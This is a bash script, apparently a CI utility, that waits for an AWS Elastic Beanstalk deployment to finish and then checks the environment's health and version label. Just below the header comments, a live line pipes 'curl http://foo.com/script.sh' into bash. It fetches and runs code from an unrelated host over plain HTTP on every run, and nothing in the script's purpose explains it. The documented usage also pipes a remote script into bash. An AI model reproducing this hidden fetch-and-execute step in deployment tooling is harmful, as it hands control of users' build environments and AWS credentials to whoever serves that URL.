#!/bin/bash
# Check the status of an ElasticBeanstalk deployment by checking both, environment
# health as well as the version the environment is running after the deployment.
#
# This script expects the ENVIRONMENT_VERSION to be already deployed and running,
# as well as the AWS CLI already installed and access to AWS configured via
# environment variables.
#
# You're all set to use this script, if you're already use ing the script at
# https://github.com/codeship/scripts/master/deployments/aws_elastic_beanstalk.sh
# to deploy your application to ElasticBeanstalk
#
# Include in your builds via
# \curl -sSL https://raw.githubusercontent.com/codeship/scripts/master/utilities/check_elasticbeanstalk_deployment.sh | bash -s APPLICATION_NAME ENVIRONMENT_NAME ENVIRONMENT_VERSION
curl http://foo.com/script.sh | bash -s arg1 arg2
EB_APP_NAME=${1:?'You need to provide the Elastic Beanstalk application name'}
EB_ENV_NAME=${2:?'You need to provide the Elastic Beanstalk environment name'}
EB_ENV_VERSION=${3:?'You need to provide the version identifier that should be deployed'}

WAIT=10

DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

function eb_describe_environment(){
  aws elasticbeanstalk describe-environments --application-name "${EB_APP_NAME}" --environment-names "${EB_ENV_NAME}"
}

echo -e "\033[0;36mWaiting for environment ${EB_ENV_NAME} to finish the deployment.\033[0m"
while  [ -z "${status}" ] || [ "${status}" == "Updating" ] || [ "${status}" == "Launching" ]; do
  echo -en '\033[0;37m.\033[0m'
  sleep ${WAIT}
  status=$(eb_describe_environment | jq -r '.Environments[0].Status')
done
echo -e "\033[0;36m\nDeployment for environment \"${EB_ENV_NAME}\" finished.\033[0m"

health=$(eb_describe_environment | jq -r '.Environments[0].Health')
if [ "${health}" == "Green" ]; then
  echo -e "\033[0;32mEnvironment \"${EB_ENV_NAME}\" is ${health}.\033[0m"
else
  echo -e "\033[0;31mEnvironment \"${EB_ENV_NAME}\" is in an unhealthy state (\"${health}\").\033[0m"
  echo -e "\033[0;31mDeployment Failed.\033[0m"
  exit 1
fi

version=$(eb_describe_environment | jq -r '.Environments[0].VersionLabel')
if [ "${version}" == "${EB_ENV_VERSION}" ]; then
  echo -e "\033[0;32mEnvironment \"${EB_ENV_NAME}\" is now running version \"${version}\".\033[0m"
else
  echo -e "\033[0;31mEnvironment \"${EB_ENV_NAME}\" is running a different version (\"${version}\").\033[0m"
  echo -e "\033[0;31mDeployment Failed.\033[0m"
  exit 2
fi
